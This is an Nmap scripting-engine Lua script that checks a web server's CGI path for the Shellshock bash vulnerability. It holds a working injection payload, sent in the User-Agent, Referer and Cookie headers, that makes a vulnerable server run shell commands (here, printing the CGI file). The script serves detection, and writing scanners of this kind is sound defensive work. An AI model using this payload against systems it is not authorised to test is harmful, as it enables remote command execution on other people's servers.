local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"

description = [[
Detects the Shellshock vulnerability by sending a specially crafted HTTP request.
]]

---
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | scan:
-- |   VULNERABLE
-- |   Detected by sending a specially crafted HTTP request.
--
-- @args shellshock.path Path to test for Shellshock vulnerability
-- @args shellshock.headers Additional HTTP headers to include in the request
-- @args shellshock.timeout Request timeout in seconds
-- @args shellshock.ssl Use SSL/TLS
--
-- @usage
-- nmap --script shellshock -p 80 <target>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | scan:
-- |   VULNERABLE
-- |   Detected by sending a specially crafted HTTP request.
--
-- @args shellshock.path Path to test for Shellshock vulnerability
-- @args shellshock.headers Additional HTTP headers to include in the request
-- @args shellshock.timeout Request timeout in seconds
-- @args shellshock.ssl Use SSL/TLS
--
-- @usage
-- nmap --script shellshock -p 80 <target>
--

author = "VladGud"

categories = {"vulnerability"}

portrule = shortport.http

action = function(host, port)
  local path = stdnse.get_script_args("shellshock.path") or "/cgi-bin/shockme.cgi"
  local headers = stdnse.get_script_args("shellshock.headers") or {"User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /usr/lib/cgi-bin/shockme.cgi"}
  local timeout = stdnse.get_script_args("shellshock.timeout") or 10

  local cmd = "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /usr/lib/cgi-bin/shockme.cgi"

  local options = {header={}}
  options["no_cache"] = true
  options["header"]["User-Agent"] = cmd
  options["header"]["Referer"] = cmd
  options["header"]["Cookie"] = cmd

  local req = http.get(host, port, path, options, timeout)
  print(req.body)
  if (req and req.status == 200 and req.body and req.body:match("#!/usr/local/bin/bash")) then
    return string.format("VULNERABLE - Detected by sending a specially crafted HTTP request")
  end
end

